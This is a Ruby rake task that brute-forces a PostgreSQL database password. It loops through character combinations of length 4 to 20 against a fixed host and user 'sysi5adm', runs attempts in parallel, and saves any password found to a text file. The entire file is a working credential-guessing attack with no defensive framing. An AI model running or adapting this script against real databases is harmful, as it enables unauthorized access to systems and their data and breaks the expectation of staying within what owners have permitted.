namespace :test do
  require 'pg'

  task brute_db: :environment do
    Thread.abort_on_exception = true
    begin
      # job_queue = SizedQueue.new(3)
      (4..20).each do |num_of_Char|
        generate_word(num_of_Char,[]) do |word|
          # job_queue.push(word)
          # Thread.new do
            connect_db(word)
            # job_queue.pop
          # end
        end
      end

    rescue => StopRecursive
      puts"found password: #{StopRecursive.message}"
    end
  end

  def generate_word(n, alphabets, &block)
    if alphabets.length == n - 1
      Parallel.each(48..122, in_processes: 5) do |num|
        word = (alphabets +[num.chr]).join
        block.call word
      end
    else
      (48..122).each do |num|
        new_alphabets = alphabets +[num.chr]
        generate_word(n, new_alphabets, &block)
      end
    end
  end

  def connect_db(pass)
    begin
      con = PG.connect  dbname: 'i5_TEST',
                        user: 'sysi5adm',
                        host: 'db',
                        port: '5444',
                        password: pass
      puts "Password db psql: #{pass}"
      File.write("#{Rails.root}/pass_db.txt","Password db psql: #{pass}")
      raise StopRecursive.new(pass)
    rescue PG::Error => e
      puts e.message
      puts "pass error #{pass}"
      nil
    ensure
      con.close if con
    end
  end



  class StopRecursive < StandardError;end
end